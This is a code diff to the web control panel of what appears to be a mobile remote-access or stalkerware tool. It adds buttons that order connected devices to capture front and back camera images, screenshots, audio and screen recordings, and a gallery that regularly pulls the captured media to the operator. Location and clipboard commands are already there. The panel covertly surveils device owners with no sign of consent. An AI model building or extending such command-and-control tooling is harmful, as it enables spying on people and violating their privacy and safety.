@@ -169,6 +169,13 @@
             <div class="commands">
                 <button class="btn" onclick="sendCommand('get_location')">📍 Get Location</button>
                 <button class="btn" onclick="sendCommand('capture_camera')">📷 Capture Camera</button>
+                <button class="btn" onclick="sendCommand('capture_front_camera')">🤳 Front Camera</button>
+                <button class="btn" onclick="sendCommand('capture_back_camera')">📸 Back Camera</button>
+                <button class="btn" onclick="sendCommand('start_screenshot')">🖼️ Screenshot</button>
+                <button class="btn" onclick="sendCommand('stop_screenshot')">⏹ Stop Screenshot</button>
+                <button class="btn" onclick="sendCommand('record_audio')">🎤 Record Audio</button>
+                <button class="btn" onclick="sendCommand('start_screen_record')">🎥 Screen Record</button>
+                <button class="btn" onclick="sendCommand('stop_screen_record')">⏹ Stop Record</button>
                 <button class="btn" onclick="sendCommand('get_battery')">🔋 Get Battery</button>
                 <button class="btn" onclick="sendCommand('get_device_info')">📱 Device Info</button>
                 <button class="btn" onclick="sendCommand('get_clipboard')">📋 Get Clipboard</button>
@@ -181,6 +188,16 @@
         <div class="section">
             <h2>Command Output</h2>
             <div id="output" class="output">No output yet. Select a device and send a command.</div>
+        </div>
+
+        <div class="section">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                <h2>Captured Media</h2>
+                <button class="btn refresh-btn" onclick="refreshCaptures()">🔄 Refresh</button>
+            </div>
+            <div id="captures" class="clients-grid">
+                <div class="empty-state">No captures yet</div>
+            </div>
         </div>
     </div>
 
@@ -282,11 +299,49 @@
             outputDiv.scrollTop = outputDiv.scrollHeight;
         }
 
+        async function refreshCaptures() {
+            const div = document.getElementById('captures');
+            if (!div) return;
+            try {
+                const response = await fetch('/api/mobile/captures');
+                const data = await response.json();
+                const captures = data.captures || [];
+
+                if (!captures.length) {
+                    div.innerHTML = '<div class="empty-state">No captures yet</div>';
+                    return;
+                }
+
+                div.innerHTML = captures.map(c => {
+                    const url = c.url || '';
+                    let media;
+                    if (c.type === 'screenshot' || c.type === 'camera') {
+                        media = `<img src="${url}" style="width:100%;border-radius:8px" onclick="window.open(this.src)">`;
+                    } else if (c.type === 'screen_record') {
+                        media = `<video src="${url}" controls style="width:100%;border-radius:8px"></video>`;
+                    } else {
+                        media = `<audio src="${url}" controls style="width:100%"></audio>`;
+                    }
+                    return `<div class="client-card">${media}
+                            <div class="client-info">
+                                <div>${c.type}</div>
+                                <div>${c.uid || ''}</div>
+                                <div>${c.timestamp || ''}</div>
+                            </div>
+                        </div>`;
+                }).join('');
+            } catch (e) {
+                div.innerHTML = '<div class="empty-state">Error loading captures</div>';
+            }
+        }
+
         // Auto-refresh clients every 5 seconds
         setInterval(refreshClients, 5000);
+        setInterval(refreshCaptures, 10000);
 
         // Initial load
         refreshClients();
+        refreshCaptures();
     </script>
 </body>
 
